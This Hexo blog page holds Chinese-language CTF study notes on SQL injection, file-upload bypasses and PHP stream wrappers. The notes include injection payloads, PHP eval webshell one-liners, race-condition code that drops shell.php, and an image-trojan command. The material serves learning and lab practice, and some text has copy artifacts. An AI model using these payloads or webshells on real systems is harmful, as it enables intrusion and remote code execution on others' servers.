<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-SQL" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/28/SQL/" class="article-date">
  <time datetime="2022-01-28T11:37:50.170Z" itemprop="datePublished">2022-01-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SQL基础知识"><a href="#SQL基础知识" class="headerlink" title="SQL基础知识"></a>SQL基础知识</h1><h4 id="一、注入分类"><a href="#一、注入分类" class="headerlink" title="一、注入分类"></a>一、注入分类</h4><ul>
<li><p>注入点分类 </p>
</li>
<li><p>数字型注入 </p>
</li>
<li><p>字符型注入：单引号，双引号，加括号等等 </p>
</li>
<li><p>提交方式分类 </p>
</li>
<li><p>GET 方式注入 </p>
</li>
<li><p> POST 方式注入 </p>
</li>
<li><p>COOKIE 方式注入 </p>
</li>
<li><p>HTTP 头部注入：XFF，UA，REFRERE </p>
</li>
<li><p> 是否回显 </p>
</li>
<li><p> 联合查询 </p>
</li>
<li><p> 布尔盲注 </p>
</li>
<li><p>报错注入 </p>
</li>
<li><p>时间盲注 </p>
</li>
<li><p> 二次注入 </p>
</li>
<li><p>堆叠查询（同时执行多条语句） </p>
</li>
</ul>
<h4 id="二、注入判断"><a href="#二、注入判断" class="headerlink" title="二、注入判断"></a>二、注入判断</h4><p>\1. 工具扫描：网站漏扫工具，AWVS、AppScan、OWASP-ZAP、Nessus等 </p>
<p>\2. 手动测试： </p>
<ul>
<li> 单双引号，括号，进行组合测试，看是否报错 </li>
<li> 对于数字型 ?id=3-1 ?id=2# </li>
</ul>
<p>如果显示的是 ?id=2 时的正常页面，就说明我们所写的表达式进行了正确运算，可判断注 </p>
<p>入点是 数字型注入；如果返回不正常，则可能是非数字型注入。 </p>
<ul>
<li>对于字符型 ?id=2a ?id=2’#Mysql 中，等号两边如果类型不一致，会发生强制类型转换。当数字与字符串进行比较时， </li>
</ul>
<p>首先先将字符串转换成数字，然后再进行比较。类似于 PHP 里面的 弱类型比较 ==。 </p>
<ul>
<li><p>对于布尔盲注</p>
<p>布尔型盲注是在没有回显点，只会返回对或者错，这两种情况。</p>
<p>判断步骤：</p>
<h5 id="第一步：猜测数据库名称的长度"><a href="#第一步：猜测数据库名称的长度" class="headerlink" title="第一步：猜测数据库名称的长度"></a>第一步：猜测数据库名称的长度</h5><p>我们可以这样只用burp去跑，就会发现页面不正常。或者返回包长度不一样</p>
<h5 id="第二步：查询库名"><a href="#第二步：查询库名" class="headerlink" title="第二步：查询库名"></a>第二步：查询库名</h5><p>利用substr() 截取数据库，然后使用ascii() 函数，转换为数字，也就是ascii码</p>
<h5 id="第三步，获取表名"><a href="#第三步，获取表名" class="headerlink" title="第三步，获取表名"></a>第三步，获取表名</h5><h5 id="第四步：获取字段"><a href="#第四步：获取字段" class="headerlink" title="第四步：获取字段"></a>第四步：获取字段</h5><h5 id="第四步：获取字段-1"><a href="#第四步：获取字段-1" class="headerlink" title="第四步：获取字段"></a>第四步：获取字段</h5><ul>
<li><p>对于 时间盲注 </p>
<p>?id=1’ and sleep(3)# ，类似的有以下几种 </p>
<p>在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) </p>
<p>，这个函数执行的结果，是将表达式 expr 执行 count 次 。 </p>
<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要 </p>
<p>长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在 </p>
<p>盲注中被称为Timing Attack，也就是时间盲注。</p>
</li>
</ul>
</li>
</ul>
<ol>
<li><p>常见 SQL 注入功能点 </p>
<p>只要是存在数据库交互的地方都有可能出现 SQL 注入。 </p>
<p>常出现在 登录页面、订单页面、文章或新闻展示页面、修改密码页面（二次注入）、涉及获 </p>
<p>取 HTTP 头（</p>
<p>XFF等）的功能点等。 </p>
<ol>
<li><p>注释：–+ #(%23) </p>
</li>
<li><p>闭合方法：注释闭合、手动闭合 and ‘1</p>
</li>
</ol>
</li>
</ol>
<h4 id="三、Mysql-注入"><a href="#三、Mysql-注入" class="headerlink" title="三、Mysql 注入"></a>三、Mysql 注入</h4><h5 id="3-1元数据库-information-schema"><a href="#3-1元数据库-information-schema" class="headerlink" title="3.1元数据库 information_schema"></a>3.1元数据库 information_schema</h5><p>元数据库 information_schema 中：</p>
<p>存放数据库信息的表：schemata </p>
<p>schemata 表中</p>
<p>字段 schema_name 存放所有数据库名；</p>
<p>存放表信息的表：tables </p>
<p>tables 表中</p>
<p>字段 table_name 存放所有表名</p>
<p>字段 table_schema 存放所有表所在的数据库名；</p>
<p>存放所有字段信息的表：columns </p>
<p>columns 表中</p>
<p>字段 column_name 存放所有字段名，</p>
<p>字段 table_name 存放所有字段所在的表名，</p>
<p>字段 table_schema 存放所有字段所在的数据库名；</p>
<h5 id="语句分类："><a href="#语句分类：" class="headerlink" title="语句分类："></a>语句分类：</h5><p>1 1.DQL(数据查询语言)：查询语句，所有的 select 语句</p>
<p>2 2.DML(数据操作语言)：insert , delete , update , 对表中的 数据 进行 增删改</p>
<p>3 3.DDL(数据定义语言)：create , drop , alter 对表 结构 的 增删改</p>
<p>4 4.TCL(事务控制语言)：commit 提交数据，rollback 回滚数据 Transaction </p>
<p>5 5.DCL(数据控制语言)：grant 授权，revoke 撤销权限等</p>
<h5 id="基本语句：如：-查库："><a href="#基本语句：如：-查库：" class="headerlink" title="基本语句：如：# 查库："></a>基本语句：如：# 查库：</h5><p>show databases； </p>
<p> select schema_name from information_schema.schemata； </p>
<h1 id="建库："><a href="#建库：" class="headerlink" title="建库："></a>建库：</h1><p> create database + 库名; </p>
<h1 id="删库："><a href="#删库：" class="headerlink" title="删库："></a>删库：</h1><p> drop database + 库名; </p>
<h1 id="进入数据库："><a href="#进入数据库：" class="headerlink" title="进入数据库："></a>进入数据库：</h1><p> use + 库名；</p>
<h5 id="基本函数-："><a href="#基本函数-：" class="headerlink" title="基本函数 ："></a>基本函数 ：</h5><p>如：#数据库安装、路径，用户 信息</p>
<p>version(); Mysql 数据库版本</p>
<p>database(); 当前 数据库名</p>
<p>user(); 数据库的用户名</p>
<p>current_user(); 当前用户名</p>
<p>session_user(); </p>
<p>连接到数据库的用户名</p>
<p>system_user(); 系统用户名</p>
<p>导入数据： </p>
<p>1 当希望导入一个 较大 的文件或者是想要批量的执行sql语句时，可以使用 mysql 中的 source </p>
<p>2 使用方法：source + 文件路径(直接拖拽) </p>
<h4 id="3-2-语句"><a href="#3-2-语句" class="headerlink" title="3.2 语句"></a>3.2 语句</h4><p>如：# order by</p>
<p> select username from users order by 字段名；</p>
<p> 注：默认为升序排列</p>
<p> 序：asc</p>
<p>select username from users order by 字段名 asc；</p>
<p> 指定降序：desc</p>
<p>select username from users order by 字段名 desc；</p>
<p>双重需求：</p>
<p> select username from users order by 字段名1 desc,字段名2 asc；</p>
<h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h1><p> select sum(grade) from users;</p>
<p> select avg(grade) from users;</p>
<p>select max(grade) from users;</p>
<p> select min(grade) from users;</p>
<h1 id="空处理函数"><a href="#空处理函数" class="headerlink" title="空处理函数"></a>空处理函数</h1><p> select sum(ifnull(salary,0)*12), from crew;</p>
<p>求一年的薪水之和，当薪水为NULL时，被当作0来处理</p>
<h5 id="or-语句"><a href="#or-语句" class="headerlink" title="or 语句"></a>or 语句</h5><p>当前面语句不符合情况或者出现错误时执行or后面的内容 </p>
<h4 id="四、union-联合注入-单引号闭合字符型为例"><a href="#四、union-联合注入-单引号闭合字符型为例" class="headerlink" title="四、union 联合注入(单引号闭合字符型为例)"></a>四、union 联合注入(单引号闭合字符型为例)</h4><p>注入判断 </p>
<p> ?id=1’ </p>
<p> ?id=1’#order by 查列 </p>
<p>?id=1’ order by x–+ </p>
<p> ?id=1’ order by x#-&gt;常用%23代替</p>
<h1 id="其中x输入数字代表哪一列，使用二分法缩小范围-x之后是两个减号与加号，代表注释"><a href="#其中x输入数字代表哪一列，使用二分法缩小范围-x之后是两个减号与加号，代表注释" class="headerlink" title="其中x输入数字代表哪一列，使用二分法缩小范围,x之后是两个减号与加号，代表注释"></a>其中x输入数字代表哪一列，使用二分法缩小范围,x之后是两个减号与加号，代表注释</h1><p>判断回显位置，三列为例 </p>
<p> ?id=-1’ union select 1,2,3–+ </p>
<p> ?id=0’ union select 1,2,3–+ </p>
<p> ?id=1’ and 1=2 union select 1,2,3–+ </p>
<h1 id="前面是为了否定-id-1-时的回显，防止人家的-sql-语句只-limit-0-1"><a href="#前面是为了否定-id-1-时的回显，防止人家的-sql-语句只-limit-0-1" class="headerlink" title="前面是为了否定 id=1 时的回显，防止人家的 sql 语句只 limit 0,1"></a>前面是为了否定 id=1 时的回显，防止人家的 sql 语句只 limit 0,1</h1><h1 id="这样就无法查看到我们想要的信息了"><a href="#这样就无法查看到我们想要的信息了" class="headerlink" title="这样就无法查看到我们想要的信息了"></a>这样就无法查看到我们想要的信息了</h1><p>回显位置注入 sql 语句 </p>
<p>查库 </p>
<p>查某一个库中的表</p>
<p>查列 </p>
<p>查内容， ~ 连接 </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/28/SQL/" data-id="ckyye024800007kv3hr79dyf5" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/26/web8/" class="article-date">
  <time datetime="2022-01-26T10:42:48.215Z" itemprop="datePublished">2022-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><ol start="6">
<li><h5 id="htaccess-攻击"><a href="#htaccess-攻击" class="headerlink" title=".htaccess 攻击"></a><strong>.htaccess</strong> 攻击</h5></li>
</ol>
<ul>
<li>上传.htaccess⽂件 </li>
</ul>
<p>httpd-conf 是APache 系统的配置⽂件（全局的）； </p>
<p>.htaccess ⽂件是 Apache 服务器的分布式配置⽂件（局部的），该配置⽂件会覆盖 </p>
<p>Apache服务器的全局配置，只对 该⽂件所在⽬录下的⽂件起作⽤。 </p>
<p>如果⼀个Web应⽤程序允许上传.htaccess⽂件，则说明攻击者可以更改Apache的配 </p>
<p>置。 </p>
<ul>
<li><p> 缺点：只在 Apache 服务器 下起作⽤ </p>
</li>
<li><p>使⽤条件： </p>
</li>
</ul>
<p>Apache⽬录下：/conf/httpd.conf 中 AllowOverride 为 All 则意味 </p>
<p>着.htaccess ⽂件可更改 Apache 配置利⽤⼀：将指定后缀⽂件当作 php ⽂件处理 </p>
<p> AddType application/x-httpd-php .jpg //会将 jpg 文件当作 php 解析会将 jpg 文</p>
<p>件当作 php 解析或者 SetHandler application/x-httpd-php //所有文件都会当作php文件解析</p>
<p>利⽤⼆：⽂件当中包含 php 关键字 </p>
<p> 文件名中只要包含 .php 关键字就当作php处理：phpinfo.php.png </p>
<p>在 .htaccess 文件中写入：</p>
<p> AddHandler php5-script php </p>
<p>利⽤三：匹配⽂件名 </p>
<p> 匹配文件名：文件名</p>
<p>&lt;FilesMatch “文件名”&gt; </p>
<p>SetHandler application/x-httpd-php </p>
 </FilesMatch> 

<p>在Apache的解析顺序中，是从右到左开始解析⽂件后缀的。如果最右侧的扩展名不可识别，就 </p>
<p>继续往左判断，直到遇到可解析的⽂件为⽌ </p>
<ol start="7">
<li><h5 id="user-ini-攻击"><a href="#user-ini-攻击" class="headerlink" title=".user.ini 攻击"></a><strong>.user.ini</strong> 攻击</h5></li>
</ol>
<p>PHP中的每个配置都有其所处的模式。其中允许使⽤ .user.ini 能够更改的模式 </p>
<p>有 PHP_INI_PERDIR 和 PHP_INI_USER 等等。 </p>
<p>⽽ PHP_INI_PERDIR 这个模式当中的 auto_append_fifile 和 auto_prepend_fifile 这 </p>
<p>两个配置对我们有很⼤帮助。 </p>
<p>auto_append_fifile ：指定⼀个⽂件在主⽂件解析之前解析； </p>
<p>auto_prepend_fifile：指定⼀个⽂件在主⽂件之后解析。 原理：我们可以使⽤ auto_prepend_fifile 这个选项，将我们所要上传的图⽚⻢在该 </p>
<p>⽬录下的其它PHP⽂件执⾏之前⾸先 包含 我们所上传的图⽚⻢。相当于在原有 </p>
<p>的 PHP⽂件的代码开头加上了 require(‘a.jpg’) ，从⽽进⾏了 文件包</p>
<p>含 ，这样我们的图⽚⻢就得到了利⽤。 </p>
<ul>
<li><p>优点：不仅仅限于 Apache 服务器，还可以⽤于 Nginx , IIS 等服务器。 </p>
</li>
<li><p>使⽤条件： </p>
</li>
<li><p>上传的 .user.ini ⽬录下必须含有 .php ⽂件，⽽⼀般的题⽬当中不会含有。 </p>
</li>
<li><p>服务器使⽤CGI／FastCGI模式 </p>
</li>
</ul>
<ol start="7">
<li>1上传.user.ini⽂件 </li>
</ol>
<p> auto_prepend_file=a.jpg //自动在每个页面包含a.jpg文件，如果在php文件中包含jpg文</p>
<p>件就会导致a.jpg被当成php文件解析</p>
<ul>
<li> 特殊⽤法1：⽇志⽂件包含 </li>
</ul>
<p> auto_prepend_file =/var/log/nginx/access.log</p>
<p>7.2上传 .user.ini ⽂件 </p>
<p>1 auto_prepend_file=/tmp/sess_test //test要记住</p>
<ul>
<li><p>利⽤脚本上传⽂件 </p>
</li>
<li><p>session.upload_progress.enabled 这个参数在php.ini默认开启，需要⼿ </p>
<p>动配置offff，如果不是offff，就会在上传的过程中⽣成上传进度的⽂件，他的存储路径可</p>
<p>以在phpinfo(),中找到 </p>
<ol start="8">
<li><h5 id="⽂件上传和⽂件包含结合"><a href="#⽂件上传和⽂件包含结合" class="headerlink" title="⽂件上传和⽂件包含结合:"></a>⽂件上传和⽂件包含结合:</h5></li>
</ol>
<p>上传⽂件之后可能访问的时候是通过某⼀个参数访问，这时就应该想到这个参数适⽤做⽂件包含 </p>
<p>将我们请求的⽂件包含在当前⻚⾯，如果当前⻚⾯是PHP⽂件那么，我们请求的⽂件就会当作  </p>
<ol start="9">
<li><h5 id="⼆次渲染-png图⽚⼆次渲染"><a href="#⼆次渲染-png图⽚⼆次渲染" class="headerlink" title="⼆次渲染: png图⽚⼆次渲染:"></a>⼆次渲染: png图⽚⼆次渲染:</h5></li>
</ol>
<p>直接在png图⽚的IDTA数据块写⼊⼀句话，避免了被修改:</p>
<p>⽣成⼀张在IDTA数据块写有 $_GET<a href="$_POST%5B1%5D">0</a> 的⼀句话⽊⻢的png图⽚，上传 </p>
<p>之后再执⾏ </p>
<p>具体原理是IDAT数据块放着png图⽚的重要信息，⼀般不会被重新渲染 </p>
<ul>
<li>gif 图⽚⼆次渲染: </li>
</ul>
<p>使⽤ 010将gif图⽚的最后加上⼀句话，上传之后，将上传之后的图⽚下载下来，再次打开010 </p>
<p>查看，发现原本我们写⼊的⼀句话已经消失了。 </p>
<p>但与之前的图⽚进⾏对照，仍有未经渲染（改变）的部分，我们可以讲⼀句话写⼊不会被渲染的 部分进⾏上传即可。 </p>
<ul>
<li><p>jpg 图⽚⼆次渲染:</p>
<p>1.先找⼀张jpg上传，将上传的图⽚进⾏下载，kali运⾏脚本</p>
<p>2.010打开查看 </p>
<p>写⼊成功 </p>
<h5 id="10-条件竞争"><a href="#10-条件竞争" class="headerlink" title="10.条件竞争:"></a>10.条件竞争:</h5><p>⼀些⽹站的逻辑是先允许上传任意⽂件，然后检查上传的⽂件是否包含WebShell脚本，若果包 </p>
<p>含就会删除⽂件。这⾥存在的问题是⽂件上传成功之后和删除⽂件之间存在⼀个短的时间差(因 </p>
<p>为要执⾏检查⽂件和删除⽂件的操作)，攻击者就可以利⽤⾜额个时间差完成竞争条件的上传漏 </p>
<p>洞攻击 </p>
<p>攻击者写上传WebShell脚本 10.pho，10.php的内容是⽣成⼀个新的WebShell脚本 </p>
<p>shell.php，10.php的代码如下: </p>
<?php 

 fputs(fopen('../shell.php','w'),'<?php @eval($_POST[1]);?><p>‘) </p>
<p> ?&gt; </p>
<ul>
<li>当10.php上传成功之后，客户端⽴即访问10.php，则会在上级⽬录下⾃动⽣成 shell.php</li>
</ul>
<h5 id="11-upload-lab相关知识"><a href="#11-upload-lab相关知识" class="headerlink" title="11.upload-lab相关知识"></a>11.upload-lab相关知识</h5><ul>
<li><p>⿊名单没有完全过滤所有后缀名 </p>
</li>
<li><p> 构造php::$DATA绕过 windows中会被认为是php⽂件解析 </p>
</li>
<li><p>windows系统中 .php. 会⾃动认为是 . </p>
</li>
<li><p>⽂件头 </p>
</li>
</ul>
<p>GIF89a(16进制) =47494638 </p>
<ul>
<li><p>构造图⽚⻢命令: </p>
</li>
<li><p> move_upload_fifile问题(upload-19) </p>
</li>
</ul>
<p>  1 1. move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php</p>
<p>  是不行的</p>
<p>  发现 move_uploaded_file() 函数中的 img_path 是由 post 参数 </p>
<p>  save_name 控制的，因此可以在 save_name 利⽤00截断绕过 </p>
</li>
</ul>
</li>
</ul>
<ol start="12">
<li><h5 id="CTF-常⻅思路"><a href="#CTF-常⻅思路" class="headerlink" title="CTF 常⻅思路"></a>CTF 常⻅思路</h5></li>
<li><p>找到允许上传的⽂件类型，抓包 </p>
</li>
<li><p>在 Content-Type 正确的情况下，⾸先尝试直接更改 后缀为 .php ，写⼊⼀句话⽊⻢ </p>
</li>
<li><p>上述不允许的情况下，观察服务器类型，nginx 尝试 .user.ini ，Apache 尝试.htaccess </p>
</li>
<li><p>.user.ini 注意该⽬录下是否已经含有 .php ⽂件 </p>
<p>过滤 php </p>
<p>⽇志包含：过滤 . Web 162-163</p>
<p>⼆次渲染 Web 164 165 </p>
<p>后缀类型不可猜测时，.zip ⽂件上传 Web 166</p>
<p>免杀 Web 168 </p>
<p>前端做后缀检测，后端做不同后缀的 Content-Type 检测，注意抓包后修改 Content- </p>
<p>Type 为⽩名单</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/26/web8/" data-id="ckyvjgj970000mwv32bsq7nvw" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web7" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/25/web7/" class="article-date">
  <time datetime="2022-01-25T11:23:47.467Z" itemprop="datePublished">2022-01-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><p>其他协议后补</p>
<p>⽂件上传:</p>
<ol>
<li><h5 id="没有丝毫过滤"><a href="#没有丝毫过滤" class="headerlink" title="没有丝毫过滤"></a>没有丝毫过滤</h5></li>
</ol>
<p>上传php⽂件，之后访问执⾏⼀句话 </p>
<ol start="2">
<li><h5 id="有前端js检验"><a href="#有前端js检验" class="headerlink" title="有前端js检验:"></a>有前端js检验:</h5></li>
</ol>
<ul>
<li>先上传规定的后缀⽂件，之后bp抓包，改后缀⽂件名 </li>
</ul>
<ol start="3">
<li><h5 id="⽂件后缀绕过"><a href="#⽂件后缀绕过" class="headerlink" title="⽂件后缀绕过"></a>⽂件后缀绕过</h5></li>
</ol>
<p>在服务器限制某些后缀⽂件不允许上传，但是有些Apache是允许歇息其他⽂件后缀的，例如在 </p>
<p>https.conf中，如果配置有如下代码，就能解析php和phtml的⽂件 </p>
<p>1 AddType application/x-https-php .php .phtml </p>
<p>可尝试： </p>
<p>.php .php2 .php3 .php5 .phtml </p>
<p> .asp .aspx .ascx .ashx .asa .cer </p>
<p>.jsp .jspx </p>
<p>结合Apache⽂件解析机制，从右向左开始解析⽂件后缀，若后缀名不可识别，则继续判</p>
<p>断直到遇到可解析的后缀为⽌。 </p>
<p>⽐如：Apache的多后缀解析漏洞：解析127.0.0.1/1.php.366==127.0.0.1/1.php  </p>
<ol start="4">
<li><h5 id="⽂件类型检测"><a href="#⽂件类型检测" class="headerlink" title="⽂件类型检测:"></a>⽂件类型检测:</h5></li>
<li><p>MIME绕过：Content-Type 字段 </p>
</li>
</ol>
<p>判断 $_Files[“file”][“type”] 是不是图⽚格式（</p>
<p>image/gif、imge/jpeg、 </p>
<p>image\pjpeg），不是则不允许上传。 $_Files[“file”][“type”] 的值是从请求 </p>
<p>数据包中 Content-Type 中获取。 </p>
<ol start="2">
<li><h5 id="⽂件幻数检测"><a href="#⽂件幻数检测" class="headerlink" title="⽂件幻数检测"></a>⽂件幻数检测</h5></li>
</ol>
<p>利⽤getimagesize()函数获取图⽚的宽⾼等信息，如果上传的不是图⽚，则获取不到信息</p>
<p>绕过⽅法⼀：⽂件头添加 </p>
<p>在脚本⽂件开头补充图⽚对应的头部值，或在图⽚后写⼊写⼊脚本代码 </p>
<p>绕过⽅法⼆：上传图⽚⽊⻢</p>
<p> 一.</p>
<p> 图片合并：</p>
<p> 命令：</p>
<p>copy 1.jpg/b+phpinfo.php/a hack.jpg </p>
<p>以二进制的方式打开，写入文件</p>
<p>二.</p>
<p>1 写入到 版权 当中</p>
<p>法四：直接使⽤ 010Editor 写⼊，相当于法三 </p>
<ol start="3">
<li><h5 id="⽂件内容特殊字符过滤"><a href="#⽂件内容特殊字符过滤" class="headerlink" title="⽂件内容特殊字符过滤"></a>⽂件内容特殊字符过滤</h5></li>
</ol>
<ul>
<li>常⻅的过滤: </li>
</ul>
<p>⽂件内容: </p>
<?php eval($_POST[1]);?><p>过滤了 [] ⽤ {} 替换 </p>
 <?php eval($_POST{1})?><h5 id="5-零零截断绕过"><a href="#5-零零截断绕过" class="headerlink" title="5.零零截断绕过:"></a>5.零零截断绕过:</h5><p>截断原理: 系统在对⽂件名的读取时，如果遇到ascii码为零的位置就停⽌，⽽这个ascii </p>
<p>码为零的位置在16进制中是00，⽤0x开头表示0x00，就会认为读取已结束，也就是所</p>
<p>说的0x00截断。 </p>
<p>截断条件: php版本⼩于5.3.4,PHP的magic_quote_gpc为0ffff状态 </p>
<p>这函数是魔术引号，会对敏感的字符转义的 空就会被转义加个反斜杠 </p>
<ul>
<li><p>绕过⽅法: </p>
</li>
<li><p>⽤burp抓包，然后修改 </p>
</li>
</ul>
<p>GET ⽅式提交–会⾃动将 %00 解析为 0x00 ，发挥截断作⽤</p>
<p>当是GET接收情况的时候，直接用 %00 就可以了。</p>
<p>某些情况下，直接在文件名中加 %00 进行截断这是不对的，因为 %00 会以字符串的形式解析了。</p>
<p>如果没有做后缀名判断的情况下，那样会变成：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.xxx.com/qq.php%00.jpg">www.xxx.com/qq.php%00.jpg</a> =&gt; <a target="_blank" rel="noopener" href="http://www.xxx.com/qq.php%00.jpg">www.xxx.com/qq.php%00.jpg</a></p>
</blockquote>
<p>也就是所谓的任意文件上传漏洞了，这又是另一个概念了。如果做了后缀名判断的情况下，那样是会直接报错，不让你上传，因为你的后缀是 .jpg，不是 .php；</p>
<ul>
<li><p>POST ⽅式提交–需要⼿动将其解码为 ⼗六进制的 00 ，发挥截断作⽤ </p>
<p>当是POST接收情况的时候，正确的用法应该是我们需要对 %00 做一个URL解码，也就是URL-decode；</p>
<ul>
<li>注意：</li>
</ul>
<p>有些时候数据包中必须含有<strong>上传文件后的目录</strong>情况才可以用。</p>
<p>例如：数据包中存在 path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00</p>
<ul>
<li>两者用法不同原因：这是因为 %00 截断在 GET 中被 url 解码之后是空字符。但是在 POST 中 %00 不会被 url 解码，所以只能通过 burpsuite 修改 hex 值为 00 （URL decode）进行截断。</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/25/web7/" data-id="ckyu3qq54000028v3awtm0f62" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web6" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/24/web6/" class="article-date">
  <time datetime="2022-01-24T11:46:06.859Z" itemprop="datePublished">2022-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><ol start="3">
<li><h5 id="任意⽬录遍历"><a href="#任意⽬录遍历" class="headerlink" title="任意⽬录遍历"></a>任意⽬录遍历</h5></li>
</ol>
<p>防御： php.ini 当中的配置 open_basedir ，将很好可以设置⽤户需要执⾏的 </p>
<p>⽂件⽬录，如果设置⽬录的话，PHP仅仅在该⽬录内搜索⽂件。⽽没有设置</p>
<p>open_basedir时，⽂件包含漏洞可以访问任意⽂件</p>
<p>伪协议读取与包含： </p>
<p>结合⽂件包含函数，伪协议可以读取或者写⼊⽂件 </p>
<p>在某个文件a没有highlight_file函数进行高亮的时候我们在页面中是无法看到该页面的内容的，如果另一个页面b存在文件包含漏洞，我们就可以利用伪协议读取a文件的源码一些伪协议还可以执行命令</p>
<ul>
<li><p>fifilter协议</p>
<p>含义：file协议主要用于访问本地计算机中的文件，好比通过Windows的资源管理器中打开文件或者通过右键单击‘打开’一样。</p>
<p>使用：file协议的基本格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///文件路径</span><br></pre></td></tr></table></figure>

<p>比如需要打开E盘下txt目录中的index.txt，那么在资源管理器或者浏览器地址栏中输入：file:///E:/txt/index.txt。用file:///+文件地址，其实等价于文件的地址。即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/Users/CLi/AppData/Local/Temp/WindowsLiveWriter1627300719/supfiles52F410/wangdan-se-436963[2].jpg </span><br></pre></td></tr></table></figure>

<p>等价于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/CLi/AppData/Local/Temp/WindowsLiveWriter1627300719/supfiles52F410/wangdan-se-436963[2].jpg </span><br></pre></td></tr></table></figure>

<p>常⽤的过滤器: </p>
<ul>
<li>convert.base64-encode： </li>
</ul>
<p>convert.base64-encode 和 convert.base64-decode 使⽤这两个过滤器等同于⽤base64_encode </p>
<p>和base64_decode函数处理数据 convert.base64-encode⽀持以⼀个关 联数组给出的参数。 </p>
<p>如果给出了 line-length，base64 输出将被⽤ line-length个字符为⻓度⽽截成块。 如果给出 </p>
<p>了 line-break-chars，每块将被⽤给出的字符隔开。这些参数的效果和⽤ base64_encode()再 </p>
<p>加上 chunk_split()相同 </p>
<ul>
<li>spring.rot13 </li>
</ul>
<p>rot13编码⼯具 </p>
<p>str_rot13 –对字符串执行rot13转换，ROT13编码简单滴使用字母表中后面第</p>
<p>13个字母替换当前字母，同时忽略非字母表中的字符，编码和解码都是用相同的函数，</p>
<p>传递一个编码过的字符串作为参数，得到原始的字符</p>
<ul>
<li>其他过滤器</li>
</ul>
</li>
<li><p>data协议: </p>
<p>受限于 allow_url_include </p>
<p>可以读取数据流，也可⽤来执⾏php代码，可以把data语句认为是⼀个⽂件 </p>
</li>
</ul>
<p>常用数据格式：</p>
<ol>
<li>data:,&lt;文本数据&gt; </li>
<li>  data:text/plain,&lt;文本数据&gt; </li>
<li>  data:text/html,&lt;HTML代码&gt; </li>
<li>  data:text/html;base64,&lt;base64编码的HTML代码&gt; </li>
<li>  data:text/css,&lt;CSS代码&gt; </li>
<li>  data:text/css;base64,&lt;base64编码的CSS代码&gt; </li>
<li>  data:text/javascript,&lt;Javascript代码&gt; </li>
<li>  data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; </li>
<li>  data:image/gif;base64,base64编码的gif图片数据 </li>
<li>  data:image/png;base64,base64编码的png图片数据 </li>
<li>  data:image/jpeg;base64,base64编码的jpeg图片数据 </li>
<li>  data:image/x-icon;base64,base64编码的icon图片数据</li>
